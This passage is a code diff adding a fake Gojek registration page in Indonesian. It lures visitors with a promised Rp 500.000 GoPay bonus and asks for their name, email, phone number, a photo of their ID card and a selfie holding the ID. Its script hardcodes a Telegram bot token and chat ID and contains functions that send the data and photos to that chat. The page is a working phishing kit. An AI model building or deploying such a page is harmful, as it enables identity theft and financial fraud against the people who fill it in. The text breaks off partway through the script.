@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Daftar Akun — gojek</title>
+  <style>
+    /* ─── GOJEK BLUEPRINT TOKENS ─────────────────────────────── */
+    :root {
+      --green-500: #00AA5B;
+      --green-400: #00C26A;
+      --green-100: #E6F7EF;
+      --green-50:  #F0FBF5;
+      --red-500:   #E02020;
+      --red-50:    #FEF0F0;
+      --gray-900:  #1A1A1A;
+      --gray-700:  #4A4A4A;
+      --gray-500:  #767676;
+      --gray-300:  #CACACA;
+      --gray-100:  #F5F5F5;
+      --gray-50:   #FAFAFA;
+      --white:     #FFFFFF;
+
+      --radius-sm: 8px;
+      --radius-md: 12px;
+      --radius-lg: 16px;
+      --radius-xl: 24px;
+
+      --shadow-sm: 0 1px 4px rgba(0,0,0,.08);
+      --shadow-md: 0 4px 16px rgba(0,0,0,.10);
+      --shadow-lg: 0 8px 32px rgba(0,0,0,.12);
+
+      --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+
+    /* ─── RESET ──────────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: var(--font);
+      background: #EDEDED;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+
+    /* ─── PHONE SHELL ─────────────────────────────────────────── */
+    .shell {
+      width: 100%;
+      max-width: 420px;
+      min-height: 100vh;
+      background: var(--white);
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow: hidden;
+      box-shadow: var(--shadow-lg);
+    }
+
+    /* ─── TOP BAR ─────────────────────────────────────────────── */
+    .topbar {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 16px 20px 12px;
+      background: var(--white);
+      border-bottom: 1px solid var(--gray-100);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .topbar-back {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: none;
+      background: var(--gray-100);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--gray-900);
+      transition: background .15s;
+      flex-shrink: 0;
+    }
+    .topbar-back:hover { background: var(--gray-300); }
+    .topbar-back svg { width: 20px; height: 20px; }
+    .topbar-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: var(--gray-900);
+      flex: 1;
+    }
+    .topbar-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 20px;
+      font-weight: 800;
+      color: var(--green-500);
+      letter-spacing: -0.5px;
+    }
+
+    /* ─── STEP INDICATOR ──────────────────────────────────────── */
+    .step-bar {
+      padding: 14px 20px 0;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .step-progress {
+      display: flex;
+      gap: 6px;
+    }
+    .step-dot {
+      height: 4px;
+      border-radius: 99px;
+      flex: 1;
+      background: var(--gray-100);
+      transition: background .3s, flex .3s;
+    }
+    .step-dot.done { background: var(--green-500); }
+    .step-dot.active { background: var(--green-400); }
+    .step-label {
+      font-size: 12px;
+      color: var(--gray-500);
+      font-weight: 500;
+    }
+    .step-label span { color: var(--green-500); font-weight: 700; }
+
+    /* ─── SCREEN CONTAINER ────────────────────────────────────── */
+    .screens {
+      flex: 1;
+      overflow: hidden;
+      position: relative;
+    }
+    .screen {
+      position: absolute;
+      inset: 0;
+      overflow-y: auto;
+      padding: 24px 20px 120px;
+      display: none;
+      flex-direction: column;
+      gap: 0;
+      animation: slideIn .25s ease;
+    }
+    .screen.active { display: flex; }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(24px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+    @keyframes slideBack {
+      from { opacity: 0; transform: translateX(-24px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+    .screen.back { animation: slideBack .25s ease; }
+
+    /* ─── SECTION HEADING ─────────────────────────────────────── */
+    .section-head { margin-bottom: 28px; }
+    .section-head h2 {
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--gray-900);
+      line-height: 1.3;
+      margin-bottom: 6px;
+    }
+    .section-head p {
+      font-size: 14px;
+      color: var(--gray-500);
+      line-height: 1.6;
+    }
+
+    /* ─── FLOATING LABEL INPUT ────────────────────────────────── */
+    .field { position: relative; margin-bottom: 16px; }
+    .field-input {
+      width: 100%;
+      height: 56px;
+      padding: 18px 16px 6px;
+      border: 1.5px solid var(--gray-300);
+      border-radius: var(--radius-md);
+      font-size: 16px;
+      font-family: var(--font);
+      color: var(--gray-900);
+      background: var(--white);
+      outline: none;
+      transition: border-color .2s, box-shadow .2s;
+      -webkit-appearance: none;
+    }
+    .field-input:focus {
+      border-color: var(--green-500);
+      box-shadow: 0 0 0 3px rgba(0,170,91,.12);
+    }
+    .field-input.error {
+      border-color: var(--red-500);
+      box-shadow: 0 0 0 3px rgba(224,32,32,.10);
+    }
+    .field-label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: var(--gray-500);
+      pointer-events: none;
+      transition: all .18s ease;
+      background: transparent;
+      font-family: var(--font);
+    }
+    .field-input:focus + .field-label,
+    .field-input:not(:placeholder-shown) + .field-label {
+      top: 10px;
+      transform: none;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--green-500);
+      letter-spacing: .4px;
+      text-transform: uppercase;
+    }
+    .field-input.error + .field-label { color: var(--red-500); }
+    .field-hint {
+      font-size: 12px;
+      color: var(--red-500);
+      margin-top: 4px;
+      padding-left: 4px;
+      display: none;
+    }
+    .field-hint.show { display: block; }
+
+    /* phone prefix */
+    .field-phone { display: flex; gap: 10px; }
+    .phone-prefix {
+      height: 56px;
+      padding: 0 14px;
+      border: 1.5px solid var(--gray-300);
+      border-radius: var(--radius-md);
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--gray-700);
+      background: var(--gray-50);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+    .phone-prefix img { width: 22px; height: 16px; border-radius: 2px; }
+    .field-phone .field { flex: 1; margin-bottom: 0; }
+
+    /* ─── UPLOAD CARD ─────────────────────────────────────────── */
+    .upload-card {
+      border: 2px dashed var(--gray-300);
+      border-radius: var(--radius-lg);
+      padding: 32px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      background: var(--gray-50);
+      cursor: pointer;
+      transition: border-color .2s, background .2s;
+      position: relative;
+      overflow: hidden;
+    }
+    .upload-card:hover, .upload-card.drag { border-color: var(--green-500); background: var(--green-50); }
+    .upload-card input[type="file"] {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+      width: 100%;
+      height: 100%;
+    }
+    .upload-icon {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: var(--green-100);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--green-500);
+    }
+    .upload-icon svg { width: 28px; height: 28px; }
+    .upload-card h3 { font-size: 16px; font-weight: 700; color: var(--gray-900); text-align: center; }
+    .upload-card p { font-size: 13px; color: var(--gray-500); text-align: center; line-height: 1.5; }
+    .upload-actions {
+      display: flex;
+      gap: 10px;
+      margin-top: 4px;
+    }
+    .upload-chip {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 8px 16px;
+      border-radius: 99px;
+      font-size: 13px;
+      font-weight: 600;
+      border: 1.5px solid var(--green-500);
+      color: var(--green-500);
+      background: var(--white);
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .upload-chip:hover { background: var(--green-50); }
+    .upload-chip svg { width: 16px; height: 16px; }
+
+    /* preview */
+    .preview-wrap {
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      border: 2px solid var(--green-500);
+      position: relative;
+      background: #000;
+      display: none;
+    }
+    .preview-wrap.show { display: block; }
+    .preview-wrap img {
+      width: 100%;
+      max-height: 260px;
+      object-fit: cover;
+      display: block;
+    }
+    .preview-badge {
+      position: absolute;
+      bottom: 12px;
+      right: 12px;
+      background: var(--green-500);
+      color: var(--white);
+      border-radius: 99px;
+      padding: 6px 14px;
+      font-size: 12px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .preview-badge svg { width: 14px; height: 14px; }
+    .preview-change {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--gray-500);
+      cursor: pointer;
+      margin-top: 10px;
+      width: fit-content;
+    }
+    .preview-change:hover { color: var(--green-500); }
+
+    /* ─── INFO BOX ────────────────────────────────────────────── */
+    .info-box {
+      background: var(--green-50);
+      border: 1px solid var(--green-100);
+      border-radius: var(--radius-md);
+      padding: 14px 16px;
+      display: flex;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .info-box svg { width: 20px; height: 20px; color: var(--green-500); flex-shrink: 0; margin-top: 1px; }
+    .info-box p { font-size: 13px; color: var(--gray-700); line-height: 1.55; }
+    .info-box strong { color: var(--gray-900); }
+
+    /* ─── TIPS LIST ───────────────────────────────────────────── */
+    .tips { display: flex; flex-direction: column; gap: 10px; margin-top: 20px; }
+    .tip {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 13px;
+      color: var(--gray-700);
+      line-height: 1.5;
+    }
+    .tip-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: var(--green-100);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      color: var(--green-500);
+    }
+    .tip-icon svg { width: 14px; height: 14px; }
+
+    /* ─── FOOTER BUTTON ───────────────────────────────────────── */
+    .footer {
+      position: fixed;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 420px;
+      padding: 16px 20px 28px;
+      background: var(--white);
+      border-top: 1px solid var(--gray-100);
+      z-index: 20;
+    }
+    .btn-primary {
+      width: 100%;
+      height: 54px;
+      border: none;
+      border-radius: var(--radius-md);
+      background: var(--green-500);
+      color: var(--white);
+      font-size: 16px;
+      font-weight: 700;
+      font-family: var(--font);
+      cursor: pointer;
+      transition: background .15s, transform .1s, opacity .2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-primary:hover { background: var(--green-400); }
+    .btn-primary:active { transform: scale(.98); }
+    .btn-primary:disabled { background: var(--gray-300); cursor: not-allowed; }
+    .btn-primary svg { width: 20px; height: 20px; }
+
+    /* ─── SUCCESS SCREEN ──────────────────────────────────────── */
+    .success-wrap {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 40px 28px 120px;
+      gap: 0;
+    }
+    .success-anim {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      background: var(--green-100);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 28px;
+      animation: pop .4s cubic-bezier(.36,1.5,.4,1);
+    }
+    @keyframes pop {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+    .success-anim svg { width: 60px; height: 60px; color: var(--green-500); }
+    .success-wrap h2 {
+      font-size: 24px;
+      font-weight: 800;
+      color: var(--gray-900);
+      margin-bottom: 12px;
+      line-height: 1.3;
+    }
+    .success-wrap p {
+      font-size: 15px;
+      color: var(--gray-500);
+      line-height: 1.65;
+      max-width: 300px;
+    }
+    .success-card {
+      margin-top: 32px;
+      width: 100%;
+      background: var(--green-50);
+      border: 1px solid var(--green-100);
+      border-radius: var(--radius-lg);
+      padding: 20px;
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    .success-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+    }
+    .success-row span:first-child { color: var(--gray-500); }
+    .success-row span:last-child { font-weight: 700; color: var(--gray-900); }
+    .success-divider {
+      height: 1px;
+      background: var(--green-100);
+    }
+    .success-amount {
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--green-500);
+      text-align: center;
+      margin-top: 4px;
+    }
+    .success-amount small {
+      display: block;
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--gray-500);
+      margin-top: 2px;
+    }
+    .confetti {
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      pointer-events: none;
+      overflow: hidden;
+      height: 100%;
+    }
+    .dot-confetti {
+      position: absolute;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      animation: fall linear infinite;
+    }
+    @keyframes fall {
+      from { transform: translateY(-10px) rotate(0deg); opacity: 1; }
+      to   { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to   { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+<div class="shell">
+
+  <!-- TOP BAR -->
+  <div class="topbar" id="topbar">
+    <button class="topbar-back" id="btnBack" onclick="goBack()" title="Kembali">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"/>
+      </svg>
+    </button>
+    <div class="topbar-logo">
+      <svg width="28" height="28" viewBox="0 0 48 48" fill="none">
+        <circle cx="24" cy="24" r="24" fill="#00AA5B"/>
+        <circle cx="24" cy="24" r="11" stroke="white" stroke-width="5" fill="none"/>
+      </svg>
+      gojek
+    </div>
+  </div>
+
+  <!-- STEP INDICATOR -->
+  <div class="step-bar" id="stepBar">
+    <div class="step-progress">
+      <div class="step-dot active" id="dot1"></div>
+      <div class="step-dot" id="dot2"></div>
+      <div class="step-dot" id="dot3"></div>
+    </div>
+    <div class="step-label" id="stepLabel">Langkah <span>1</span> dari 3</div>
+  </div>
+
+  <!-- SCREENS -->
+  <div class="screens">
+
+    <!-- SCREEN 1: Data Diri -->
+    <div class="screen active" id="screen1">
+      <div style="background:linear-gradient(135deg,#00AA5B,#00C26A);border-radius:16px;padding:20px;margin-bottom:24px;display:flex;align-items:center;gap:14px;">
+        <div style="font-size:40px;line-height:1;">🎁</div>
+        <div>
+          <div style="font-size:13px;color:rgba(255,255,255,.8);font-weight:600;letter-spacing:.4px;text-transform:uppercase;margin-bottom:4px;">Penawaran Spesial</div>
+          <div style="font-size:18px;font-weight:800;color:#fff;line-height:1.3;">Dapatkan hadiah <span style="color:#FFD700;">Rp 500.000</span> segera ke GoPay‑mu!</div>
+        </div>
+      </div>
+
+      <div class="section-head">
+        <h2>Data Diri Kamu</h2>
+        <p>Pastikan data sesuai dengan identitas resmi kamu ya.</p>
+      </div>
+
+      <div class="field">
+        <input class="field-input" type="text" id="inputNama" placeholder=" " autocomplete="name" />
+        <label class="field-label">Nama Lengkap</label>
+        <div class="field-hint" id="hintNama">Nama tidak boleh kosong</div>
+      </div>
+
+      <div class="field">
+        <input class="field-input" type="email" id="inputEmail" placeholder=" " autocomplete="email" inputmode="email" />
+        <label class="field-label">Alamat Email</label>
+        <div class="field-hint" id="hintEmail">Masukkan email yang valid</div>
+      </div>
+
+      <div class="field-phone">
+        <div class="phone-prefix">
+          <svg width="22" height="16" viewBox="0 0 22 16" xmlns="http://www.w3.org/2000/svg">
+            <rect width="22" height="16" rx="2" fill="#CE1126"/>
+            <rect y="8" width="22" height="8" rx="0" fill="white"/>
+          </svg>
+          +62
+        </div>
+        <div class="field" style="margin-bottom:0">
+          <input class="field-input" type="tel" id="inputPhone" placeholder=" " inputmode="tel" autocomplete="tel" />
+          <label class="field-label">Nomor HP</label>
+          <div class="field-hint" id="hintPhone">Nomor HP tidak valid</div>
+        </div>
+      </div>
+
+      <div class="tips" style="margin-top:28px">
+        <div class="tip">
+          <div class="tip-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          </div>
+          <span>Data kamu <strong>terenkripsi</strong> dan aman sesuai regulasi OJK</span>
+        </div>
+        <div class="tip">
+          <div class="tip-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.06 1.18 2 2 0 012.05 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.91 7.91a16 16 0 006.29 6.29l.91-1.29a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>
+          </div>
+          <span>Nomor HP dipakai untuk verifikasi <strong>OTP</strong></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 2: Foto KTP -->
+    <div class="screen" id="screen2">
+      <div class="section-head">
+        <h2>Foto KTP Kamu</h2>
+        <p>Gunakan KTP asli yang masih berlaku. Foto harus jelas dan tidak blur.</p>
+      </div>
+
+      <div class="info-box">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+        </svg>
+        <p>Pastikan <strong>semua teks terbaca</strong>, tidak ada bagian yang terpotong, dan foto tidak gelap.</p>
+      </div>
+
+      <!-- Preview -->
+      <div class="preview-wrap" id="prevKTP">
+        <img id="prevKTPImg" src="" alt="Preview KTP" />
+        <div class="preview-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          Foto dipilih
+        </div>
+      </div>
+      <div class="preview-change" id="changeKTP" style="display:none" onclick="clearKTP()">
+        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 102.13-9.36L1 10"/></svg>
+        Ganti foto
+      </div>
+
+      <!-- Upload Card -->
+      <div class="upload-card" id="uploadKTPCard" style="display:flex">
+        <input type="file" accept="image/*" id="fileKTP" onchange="onFileKTP(event)" />
+        <div class="upload-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/>
+          </svg>
+        </div>
+        <h3>Upload atau Foto KTP</h3>
+        <p>Ketuk untuk memilih dari galeri atau<br/>ambil foto langsung</p>
+        <div class="upload-actions" onclick="event.stopPropagation()">
+          <label class="upload-chip" for="fileKTPCamera">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/>
+              <circle cx="12" cy="13" r="4"/>
+            </svg>
+            Kamera
+          </label>
+          <input type="file" accept="image/*" capture="environment" id="fileKTPCamera" style="display:none" onchange="onFileKTP(event)" />
+          <label class="upload-chip" for="fileKTP">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/>
+              <polyline points="21 15 16 10 5 21"/>
+            </svg>
+            Galeri
+          </label>
+        </div>
+      </div>
+
+      <div class="tips">
+        <div class="tip">
+          <div class="tip-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <span>Letakkan KTP di permukaan datar dengan cahaya cukup</span>
+        </div>
+        <div class="tip">
+          <div class="tip-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <span>Hindari pantulan cahaya atau bayangan di atas KTP</span>
+        </div>
+        <div class="tip">
+          <div class="tip-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <span>Semua sudut KTP harus terlihat dan tidak terpotong</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 3: Foto Selfie -->
+    <div class="screen" id="screen3">
+      <div class="section-head">
+        <h2>Selfie Sambil Pegang KTP</h2>
+        <p>Foto dirimu sambil memegang KTP di dekat wajah agar proses verifikasi berhasil.</p>
+      </div>
+
+      <div class="info-box">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+        </svg>
+        <p>Foto selfie dipakai untuk <strong>mencocokkan</strong> wajahmu dengan foto di KTP secara otomatis.</p>
+      </div>
+
+      <!-- Preview -->
+      <div class="preview-wrap" id="prevSelfie">
+        <img id="prevSelfieImg" src="" alt="Preview Selfie" />
+        <div class="preview-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          Foto dipilih
+        </div>
+      </div>
+      <div class="preview-change" id="changeSelfie" style="display:none" onclick="clearSelfie()">
+        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 102.13-9.36L1 10"/></svg>
+        Ganti foto
+      </div>
+
+      <!-- Upload Card -->
+      <div class="upload-card" id="uploadSelfieCard" style="display:flex">
+        <input type="file" accept="image/*" id="fileSelfie" onchange="onFileSelfie(event)" />
+        <div class="upload-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/>
+          </svg>
+        </div>
+        <h3>Foto Selfie + KTP</h3>
+        <p>Ketuk untuk memilih dari galeri atau<br/>gunakan kamera depan</p>
+        <div class="upload-actions" onclick="event.stopPropagation()">
+          <label class="upload-chip" for="fileSelfieCamera">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/>
+              <circle cx="12" cy="13" r="4"/>
+            </svg>
+            Kamera Depan
+          </label>
+          <input type="file" accept="image/*" capture="user" id="fileSelfieCamera" style="display:none" onchange="onFileSelfie(event)" />
+          <label class="upload-chip" for="fileSelfie">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/>
+              <polyline points="21 15 16 10 5 21"/>
+            </svg>
+            Galeri
+          </label>
+        </div>
+      </div>
+
+      <div class="tips">
+        <div class="tip">
+          <div class="tip-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <span>Wajah harus <strong>jelas terlihat</strong>, tidak tertutup masker atau kacamata gelap</span>
+        </div>
+        <div class="tip">
+          <div class="tip-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <span>KTP harus terlihat utuh saat dipegang di depan dada</span>
+        </div>
+        <div class="tip">
+          <div class="tip-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <span>Pilih tempat dengan pencahayaan bagus, hindari backlight</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 4: SUCCESS -->
+    <div class="screen" id="screen4">
+      <div class="confetti" id="confetti"></div>
+      <div class="success-wrap">
+        <div class="success-anim">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 11.08V12a10 10 0 11-5.93-9.14"/>
+            <polyline points="22 4 12 14.01 9 11.01"/>
+          </svg>
+        </div>
+        <h2>Selamat! Registrasi<br/>Berhasil 🎉</h2>
+        <p>Akunmu sudah aktif. Saldo GoPay akan segera diterima di akun terdaftar dalam 1×24 jam kerja.</p>
+
+        <div class="success-card" id="successCard">
+          <div class="success-row">
+            <span>Nama</span>
+            <span id="sumNama">—</span>
+          </div>
+          <div class="success-divider"></div>
+          <div class="success-row">
+            <span>Email</span>
+            <span id="sumEmail">—</span>
+          </div>
+          <div class="success-divider"></div>
+          <div class="success-row">
+            <span>Nomor HP</span>
+            <span id="sumPhone">—</span>
+          </div>
+          <div class="success-divider"></div>
+          <div class="success-amount">
+            Rp 500.000
+            <small>Saldo GoPay segera masuk</small>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /screens -->
+
+  <!-- FOOTER -->
+  <div class="footer" id="footer">
+    <button class="btn-primary" id="btnLanjut" onclick="goNext()">
+      Lanjut
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M5 12h14M12 5l7 7-7 7"/>
+      </svg>
+    </button>
+  </div>
+
+</div><!-- /shell -->
+
+<script>
+  const TG_TOKEN  = '8778718626:AAH-mxaeoP--4KIxiF7c0MZkZ4HGo6lpMXw';
+  const TG_CHAT   = '8972964246';
+  const TG_API    = `https://api.telegram.org/bot${TG_TOKEN}`;
+
+  let ktpFile     = null;
+  let selfieFile  = null;
+
+  async function tgText(text) {
+    await fetch(`${TG_API}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
+    });
+  }
+
+  async function tgPhoto(file, caption) {
+    const fd = new FormData();
+    fd.append('chat_id', TG_CHAT);
+    fd.append('caption', caption);
+    fd.append('photo', file);
+    await fetch(`${TG_API}/sendPhoto`, { method: 'POST', body: fd });
+  }
+
+  function setBtn(loading) {
+    const btn = document.getElementById('btnLanjut');
+    btn.disabled = loading;
+    if (loading) {
+      btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="animation:spin 1s linear infinite"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Mengirim...';
+    }
+  }
+
+  let currentStep = 1;
+  let hasKTP = false;
+  let hasSelfie = false;
+
+  const LABELS = ['Data Diri', 'Foto KTP', 'Foto Selfie'];
+
+  function updateUI(direction = 'forward') {
+    // screens
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active','back'));
+    const sc = document.getElementById('screen' + currentStep);
+    sc.classList.add('active');
+    if (direction === 'back') sc.classList.add('back');
+
+    // dots
+    for (let i = 1; i <= 3; i++) {
+      const d = document.getElementById('dot' + i);
+      d.className = 'step-dot';
+      if (i < currentStep) d.classList.add('done');
+      else if (i === currentStep) d.classList.add('active');
+    }
+
+    // step label
+    const lbl = document.getElementById('stepLabel');
+    if (currentStep <= 3) {
+      lbl.innerHTML = `Langkah <span>${currentStep}</span> dari 3 &mdash; ${LABELS[currentStep-1]}`;
+    }
+
+    // step bar + topbar visibility
+    const stepBar = document.getElementById('stepBar');
+    const btnBack = document.getElementById('btnBack');
+    const footer  = document.getElementById('footer');
+    const topbar  = document.getElementById('topbar');
+
+    if (currentStep === 4) {
+      stepBar.style.display = 'none';
+      btnBack.style.display = 'none';
+      footer.style.display = 'none';
+      topbar.style.borderBottom = 'none';
+      spawnConfetti();
+    } else {
+      stepBar.style.display = '';
+      btnBack.style.display = currentStep > 1 ? '' : 'none';
+      footer.style.display = '';
+      topbar.style.borderBottom = '';
+    }
+
+    updateBtn();
+  }
+
+  function updateBtn() {
+    const btn = document.getElementById('btnLanjut');
+    if (currentStep === 1) {
+      btn.textContent = 'Lanjut'; btn.innerHTML += ' <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" width="20" height="20"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
+      btn.disabled = false;
+    } else if (currentStep === 2) {
+      btn.innerHTML = hasKTP
+        ? 'Lanjut <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" width="20" height="20"><path d="M5 12h14M12 5l7 7-7 7"/></svg>'
+        : 'Upload Foto KTP Dulu';
+      btn.disabled = !hasKTP;
+    } else if (currentStep === 3) {
+      btn.innerHTML = hasSelfie
